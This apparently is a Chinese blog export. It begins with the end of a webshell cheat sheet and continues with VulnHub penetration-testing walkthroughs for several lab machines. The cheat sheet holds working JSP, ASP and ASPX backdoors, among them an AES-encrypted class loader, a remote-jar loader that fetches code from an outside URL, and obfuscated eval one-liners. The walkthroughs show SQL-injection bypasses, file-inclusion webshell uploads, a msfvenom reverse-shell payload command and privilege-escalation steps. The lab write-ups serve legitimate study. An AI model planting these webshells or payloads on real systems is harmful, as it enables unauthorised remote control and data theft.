class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;</span><br><span class="line">&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">&quot;pass&quot;</span>)!=<span class="keyword">null</span>)&#123;String k=(<span class="string">&quot;&quot;</span>+UUID.randomUUID()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>).substring(<span class="number">16</span>);session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">out.print(k);<span class="keyword">return</span>;&#125;</span><br><span class="line">Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">SecretKeySpec sec=<span class="keyword">new</span> SecretKeySpec((session.getValue(<span class="string">&quot;u&quot;</span>)+<span class="string">&quot;&quot;</span>).getBytes(),<span class="string">&quot;AES&quot;</span>);</span><br><span class="line"> c.init(<span class="number">2</span>,sec);</span><br><span class="line"> String uploadString= request.getReader().readLine();</span><br><span class="line"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%&gt;</span><br></pre></td></tr></table></figure><h3 id="反射调用外部-Jar"><a href="#反射调用外部-Jar" class="headerlink" title="反射调用外部 Jar"></a>反射调用外部 Jar</h3><p>直接用了某位师傅实现了的远程加载类，改天自己搭一下吧。</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=Class.forName(<span class="string">&quot;Load&quot;</span>,<span class="keyword">true</span>,<span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;<span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;u&quot;</span>))&#125;)).getMethods()[<span class="number">0</span>].invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;request.getParameterMap()&#125;)%&gt;</span><br></pre></td></tr></table></figure><p>使用方法：<code>?u=http://javaweb.org/Cat.jar&amp;023=A</code></p><h3 id="大🐎"><a href="#大🐎" class="headerlink" title="大🐎"></a>大🐎</h3><p>太大了，不好放，丢自己本地了</p><h2 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h2><h3 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;_&quot;)%&gt;</span><br><span class="line">&lt;%execute(request(&quot;Du1&quot;))%&gt;</span><br></pre></td></tr></table></figure><h3 id="一些简单Bypass"><a href="#一些简单Bypass" class="headerlink" title="一些简单Bypass"></a>一些简单Bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%a&#x3D;request(&quot;Du1&quot;)%&gt;&lt;%eval a%&gt;</span><br><span class="line">&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;Du1&quot;))%&gt;</span><br><span class="line">&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;1&quot;&amp;&quot;-&quot;&amp;&quot;1&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;  &#x2F;&#x2F; 密码：-2</span><br></pre></td></tr></table></figure><h2 id="ASPX"><a href="#ASPX" class="headerlink" title="ASPX"></a>ASPX</h2><h3 id="一句话-1"><a href="#一句话-1" class="headerlink" title="一句话"></a>一句话</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; validateRequest&#x3D;&quot;false&quot; %&gt;&lt;%Response.Write(eval(Request.Item[&quot;w&quot;],&quot;Du1&quot;));%&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 智慧的收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透学习入门-VulnHub自闭之旅</title>
      <link href="2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/"/>
      <url>2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>开始学点更有意思的，从 VlunHub 开始刷刷吧。</p><p>所有靶场环境来源：<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p><h2 id="Me-and-My-Girlfriend-1"><a href="#Me-and-My-Girlfriend-1" class="headerlink" title="Me and My Girlfriend: 1"></a>Me and My Girlfriend: 1</h2><p>记录一下踩到的坑吧，一开始一直找不到 IP 地址，后来尝试在自己的另外一台虚拟机里面 ifconfig 看看网段，再用 Nmap 找了一下。（要用 NAT 模式，改完之后要重启）</p><p><img src="https://i.loli.net/2021/05/10/QfTMzclrhmnC6Od.png"></p><p>可以发现这两个 IP，上面的是👴的虚拟机的 IP，那么下面那个就是靶机的 IP 了，而且可以发现只有它开启了 http 与 ssh 服务：</p><p><img src="https://i.loli.net/2021/05/10/SAcCMQ5KPG6L9hT.png"></p><p>进入页面，页面回显：<code>Who are you? Hacker? Sorry This Site Can Only Be Accessed local!</code></p><p>XFF 改一下 127.0.0.1 进入。发现存在 login 与 register，先随便注册一个账号，发现 id 从 12 开始：</p><p><img src="https://i.loli.net/2021/05/10/KXcNlg4eZusi8zU.png"></p><p>尝试修改 id，发现存在越权漏洞：（可以推测后台代码为：<code>selct * from user where id = intval($_GET[&#39;id&#39;]);</code></p><p><img src="https://i.loli.net/2021/05/10/vM635ZVh1cafJHU.png" alt="SL~LFWIE20__5MHIR6O4U_7.png"></p><p>可以爆破一下前 11 个 id 得到用户名和密码表：</p><p><img src="https://i.loli.net/2021/05/10/oBW3p8i759FjUTX.png"></p><table><thead><tr><th>id</th><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>1</td><td>eweuhtandingan</td><td>skuyatuh</td></tr><tr><td>2</td><td>aingmaung</td><td>qwerty!!!</td></tr><tr><td>3</td><td>sundatea</td><td>indONEsia</td></tr><tr><td>4</td><td>sedihaingmah</td><td>cedihhihihi</td></tr><tr><td>5</td><td>alice</td><td>4lic3</td></tr><tr><td>9</td><td>abdikasepak</td><td>dorrrrr</td></tr><tr><td>12</td><td>Du1</td><td>Du1</td></tr></tbody></table><p>ssh 连接，每个账号都试一遍，最后发现 alice 成功登上：（其实在题目描述里面也提到了 Alice，也算是一个暗示吧）</p><p><img src="https://i.loli.net/2021/05/10/LTVUujl9rsOqKHm.png"></p><p>先到处看看，获取到 flag1，继续往下看。</p><p><img src="https://i.loli.net/2021/05/10/toaRemSF38Whsqk.png"></p><p>发现 <code>/var/www/html/config/config.php</code> 中的这一句：<code>$conn = mysqli_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;ctf_pasti_bisa&#39;, &#39;ceban_corp&#39;)</code>。好家伙，数据库是 root 用户，直接 <code>su root</code> 登一波，发现 flag2</p><p><img src="https://i.loli.net/2021/05/11/JCRpyBb3YlXrcuz.png"></p><h2 id="Billu-b0x"><a href="#Billu-b0x" class="headerlink" title="Billu_b0x"></a>Billu_b0x</h2><p>Nmap 扫描一下端口及服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br></pre></td></tr></table></figure><p>访问一下 http 服务，发现是一个登陆页面，提示说 “Show me your SQLI skills”，应该是要 sql 注入。</p><p>扫一下，得到一些页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[07:43:17] 200 -  307B  - &#x2F;add</span><br><span class="line">[07:43:19] 200 -    1B  - &#x2F;c</span><br><span class="line">[07:43:21] 200 -    1KB - &#x2F;images&#x2F;</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index.php</span><br><span class="line">[07:43:21] 200 -   47KB - &#x2F;in</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel  -&gt;  index.php</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel.php  -&gt;  index.php</span><br><span class="line">[07:43:23] 200 -    8KB - &#x2F;phpmy&#x2F;</span><br><span class="line">[07:43:23] 200 -    1B  - &#x2F;show</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test.php</span><br></pre></td></tr></table></figure><p>在 test.php 发现任意文件下载：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;POST http:&#x2F;&#x2F;192.168.237.134&#x2F;test.php</span><br><span class="line">file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>可以把所有页面的源码下载下来：</p><ul><li>add.php 是一个无法使用功能的上传页面</li><li>in.php 里是 phpinfo，没有有用信息</li><li>c.php 是数据库连接文件，发现 <code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code>，从而知道数据库连接的用户名密码</li><li>/etc/passwd 中有一个 id 为 1000 的用户，名为 ica</li></ul><p>访问 phpmy，用我们获得的数据库密码去登录访问。</p><p><img src="https://i.loli.net/2021/05/11/GljBuzU34ZPCo9I.png"></p><p>获取到 index.php 中登陆的用户名与密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">biLLu</span><br><span class="line">hEx_it</span><br></pre></td></tr></table></figure><p>进入。</p><p><img src="https://i.loli.net/2021/05/11/Ty48Kgz7LcniF3P.png"></p><p>panel.php 中存在任意文件包含：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看一下 upload 的上传逻辑吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$r</span>=pathinfo(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"><span class="variable">$image</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$r</span>,<span class="variable">$image</span>)) &#123;&#125;</span><br></pre></td></tr></table></figure><p>那就直接写个 <code>&lt;?php @eval($_POST[&quot;Du1&quot;]);phpinfo(); ?&gt;</code> 的🐎，后缀改下 png，传上去包含一下就 ok 了：</p><p><img src="https://i.loli.net/2021/05/11/omna17ShKRxqwpQ.png"></p><p>反弹一下 shell，然后怎么都反弹不回，很烦，所以直接写个🐎到 upload_images 里面：<code>echo%20&#39;&lt;?php%20eval($_POST[&quot;Du1&quot;]);?&gt;&#39;%20&gt;%20uploaded_images/1.php</code>，蚁剑连上：（uploaded_images 有写权限）</p><p><img src="https://i.loli.net/2021/05/11/oPXG5jDAetKrfgC.png"></p><p><code>uname -a</code> 与 <code>cat /etc/issue</code> 查看内核及系统版本，寻找提权 exp：<a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p><p>然后传上去：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 exp.c  # 赋予权限</span><br><span class="line">gcc exp.c -o exp  # 编译</span><br><span class="line">./exp  # 执行，提权至 root</span><br></pre></td></tr></table></figure><p>登录那里其实还有另一种解法：之前提到过 sql 注入，我们可以审计一下 index.php 源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>很简单的过滤，把单引号去掉，我们用 <code>\</code> 逃逸掉就 ok 了：<code>ps=\&amp;un=or 1=1 #</code>。</p><p>对于 root 的话，还有一个点，就是 phpmyadmin 的配置文件读取：<code>/var/www/phpmy/config.inc.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;roottoor&#x27;</span>;</span><br></pre></td></tr></table></figure><p>直接拿到 root 密码。</p><hr><p>注：</p><ul><li>提权方法可以多关注主要的配置文件、数据库连接文件、用户的文件，也可以利用Ubuntu已知漏洞本地提权</li><li>MySQL 有可能被高线程目录暴破和注入宕机</li></ul><h2 id="Breach1-0"><a href="#Breach1-0" class="headerlink" title="Breach1.0"></a>Breach1.0</h2><p>注：</p><p>VM 虚机配置有静态IP地址（192.168.110.140），需要将虚拟机网卡设置为 host-only 方式组网。</p><p>具体方法：点开网络适配器，配置 vm net1 -&gt; 属性 -&gt; TCP/IPV4 -&gt; ip：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.1</span><br><span class="line">255.255.255.0</span><br><span class="line">192.168.110.254</span><br></pre></td></tr></table></figure><hr><p>Nmap 扫一下发现它把所有端口都开放了（可以用 -sF 绕过防探测策略）……我们直接访问 http。在 <a href="http://192.168.110.140/impresscms/user.php">http://192.168.110.140/impresscms/user.php</a> 可以登录 cms。</p><p><img src="https://i.loli.net/2021/05/11/mdCOWsfSDtXPM7F.png"></p><p>在 index 注释中找到一段 Base64：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo</span><br><span class="line">cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh</span><br><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure><p>获得用户名与密码，登录。</p><p>Inbox 中有三封邮件，在第三封邮件中发现 <a href="http://192.168.110.140/.keystore">http://192.168.110.140/.keystore</a> 存在一个 SSL certificate。View Account 中的 Content 有一个 SSL implementation test capture，发现流量包 <a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%EF%BC%8C%E5%90%8C%E6%97%B6%E8%8E%B7%E5%8F%96%E5%88%B0%E6%8F%90%E7%A4%BA%EF%BC%9A%60They">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap，同时获取到提示：`They</a> told me the alias, storepassword and keypassword are all set to ‘tomcat’.`，提示了别名、存储密码和密钥密码都设置为 tomcat。</p><p>利用 JDK 的 keytool.exe 解密，首先查看 keystore 中的所有证书：</p><p><code> keytool -list -keystore ./keystore</code>：（密钥库口令 tomcat）</p><p><img src="https://i.loli.net/2021/05/11/GXZI1fwaWP4piFN.png"></p><p>从密钥库中导出 .p12 证书，将 keystore 拷贝到 keytool 目录，导出名为 tomcatkeystore.p12 的证书：</p><p><code>keytool -importkeystore -srckeystore ./keystore -destkeystore tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat</code></p><p><img src="https://i.loli.net/2021/05/11/jTKaLHUbJDmrRh3.png"></p><p>然后将 .p12 证书导入打开了流量包的 WireShark：编辑 -&gt; 首选项 -&gt; Protocols -&gt; TLS -&gt; EDIT（最新版 WireShark 已经把 SSL改为 TLS，其实 SSL/TLS 都已统称通信加密协议，所以就放一块了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.110.140 8443 http 点击选择证书文件 输入密码tomcat</span><br></pre></td></tr></table></figure><p>因为 <em>8443 是 tomcat 打开 SSL 的文本服务的默认端口</em></p><p>至此成功解密流量，分析可以发现其中存在 jsp 木马的流量，以及采用 http basic 认证登录后台的流量，经过 Base64 解密后得到 tomcat 用户名及密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u&#x3D;G)4m7zB</span><br></pre></td></tr></table></figure><p>访问 <a href="https://192.168.110.140:8443/_M@nag3Me/html%EF%BC%8C%E5%A6%82%E6%9E%9C%E7%99%BB%E5%BD%95%E4%B8%8D%E6%88%90%E5%8A%9F%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95">https://192.168.110.140:8443/_M@nag3Me/html，如果登录不成功可以尝试</a> BP 发包（因为最新版浏览器如果没有相应证书会有限制，但是 BP 中有各种证书，挂个 BP 代理就上了）</p><p><img src="https://i.loli.net/2021/05/11/CszhpEtxGVRDdNH.png"></p><p>可以上传包含 jsp 马的 war 包，利用 msf 直接生成：<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.100 LPORT=2333 -f war &gt; shell.war</code>，在 msf 上设置一个监听，然后直接传马访问：（弹回来的 shell 要等巨 JB 久，👴是要放弃的时候突然发现，欸，怎么 connect 了）</p><p><img src="https://i.loli.net/2021/05/13/rltALPbhEco47BK.png"></p><p><img src="https://i.loli.net/2021/05/13/dZcur9L3xApOGPj.jpg" alt="~_G_QMR9_8RRP1MXL_V@N_3.jpg"></p><p>此时拿到了 shell 了，可以用 python 来获取交互式 shell：<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; </code></p><p><img src="https://i.loli.net/2021/05/13/LDtSI2FRCoq4XEH.png"></p><p>查看一下系统用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:</span><br><span class="line">syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:102:106::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:103:109::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false</span><br><span class="line">milton:x:1000:1000:Milton_Waddams,,,:&#x2F;home&#x2F;milton:&#x2F;bin&#x2F;bash</span><br><span class="line">tomcat6:x:104:112::&#x2F;usr&#x2F;share&#x2F;tomcat6:&#x2F;bin&#x2F;false</span><br><span class="line">colord:x:105:114:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:106:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">blumbergh:x:1001:1001:Bill Lumbergh,,,:&#x2F;home&#x2F;blumbergh:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>有两个用户很有意思：milton &amp; blumbergh（它俩都有 /bin/bash）。可以在 /var/www/5446 中发现两个有趣的 php 文件：</p><p><img src="https://i.loli.net/2021/05/13/QHYwarZ3W9FDOJm.png"></p><p>我们查看一下，里面有数据库用户 root 的信息：</p><p><img src="https://i.loli.net/2021/05/13/rCIt6ZE58MqimnY.png"></p><p>密码为空，我们直接用 mysql -uroot -p 就可以登入：</p><p><img src="https://i.loli.net/2021/05/13/bZHUfsgpeAzFi47.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use mysql;</span><br><span class="line">select user,password from user;</span><br></pre></td></tr></table></figure><p>得到用户密码表：</p><table><thead><tr><th>user</th><th>password</th></tr></thead><tbody><tr><td>root</td><td></td></tr><tr><td>milton</td><td>6450d89bd3aff1d893b85d3ad65d2ec2</td></tr><tr><td>root</td><td></td></tr><tr><td>root</td><td></td></tr><tr><td>debian-sys-maint</td><td>*A9523939F1B2F3E72A4306C34F225ACF09590878</td></tr></tbody></table><p>得到 milton 的密码 hash 为 6450d89bd3aff1d893b85d3ad65d2ec2，经解密得到：<code>thelaststraw</code>，彳亍… <code>su milton</code>，再输入密码，这样就提权到 milton 了。在历史命令中发现有 su 到 blumbergh 用户，寻找 blumbergh 用户密码。</p><p>在 <a href="http://192.168.110.140/images/bill.png">http://192.168.110.140/images/bill.png</a> 的 exif 中存在某神秘字符串 <code>coffeestains</code>，尝试作为 blumbergh 用户密码登录。成功登录，查看一下权限：</p><p><img src="https://i.loli.net/2021/05/13/iEvmcHzBZ6uaL1I.png"></p><p><img src="https://i.loli.net/2021/05/13/4Bw1tUfXdkmvNQ6.png"></p><p>可以发现 <code>/usr/share/cleanup/tidyup.sh</code> 没有写入权限，但是可以用 root 权限执行 tee 命令把反弹 shell 命令写入然后执行。（tee命令用于读取标准输入的数据，并将其内容输出成文件）</p><p>看一下 tidyup.sh 里面是啥吧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br></pre></td></tr></table></figure><p>每隔三分钟就会清理 webapps 目录下的所有文件，所以之前传的🐎如果不反弹 shell 的话很快就会被删掉。</p><p>接下来就是写入命令弹 shell 了：（同时另外开一个 terminal 来接受 shell）</p><p><img src="https://i.loli.net/2021/05/13/7PcaTGvr3MXZBwm.png"></p><p><img src="https://i.loli.net/2021/05/13/FvfjmRVUbPzk5WX.png"></p><p>可以发现我们已经提权至了 root，后面 flag 什么的便不重要了。</p><h2 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86-1"></a>Five86-1</h2><p>Nmap 扫一下。</p><p><img src="https://i.loli.net/2021/05/13/WTVzvbgFcrksuU2.png" alt="U_MH_Q9JAM05PC__GW77DJ5.png"></p><p>10000 端口开了个 <code>Webmin httpd 1.920</code>，可以搜一下有无 exp。（Webmin 是一个很好的 UNIX web 管理）</p><p><img src="https://i.loli.net/2021/05/14/x4BjoNLF6eKCp1v.png"></p><p>robots.txt 里发现 /ona 路由，访问一下，发现是 OpenNetAdmin，搜一下有无 exp：</p><p><img src="https://i.loli.net/2021/05/14/XfprCJUjvYn7TIK.png"></p><p><img src="https://i.loli.net/2021/05/14/HuPBYdxZX9LylKs.png"></p><p>把 exp 复制出来丢到 msf 里面，直接打一发：</p><p><code>cp /usr/share/exploitdb/exploits/php/webapps/47772.rb /usr/share/metasploit-framework/modules/exploits</code></p><p><img src="https://i.loli.net/2021/05/14/IFRLAYWqaoGtS8v.png" alt="2VVE3EMW08WLWS__PGPW_Z9.png"></p><p><img src="https://i.loli.net/2021/05/14/vHzlJdCqMFou97O.jpg"></p><p>在家目录里面发现提示：</p><p><img src="https://i.loli.net/2021/05/14/Qy6oFRhgStKIm3x.png"></p><p>douglas 用户的密码由 aefhrt 构成十位，可以爆破：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 aefhrt &gt; passwd</span><br><span class="line">echo &#39;douglas:$apr1$9fgG&#x2F;hiM$BtsL9qpNHUlylaLxk81qY1&#39; &gt; 1.txt</span><br><span class="line">john --wordlist&#x3D;passwd 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/14/UxMPp2Eg9VF6rBL.jpg"></p><p>要爆很久，爆出来密码为：fatherrrrr，登录一波：</p><p><img 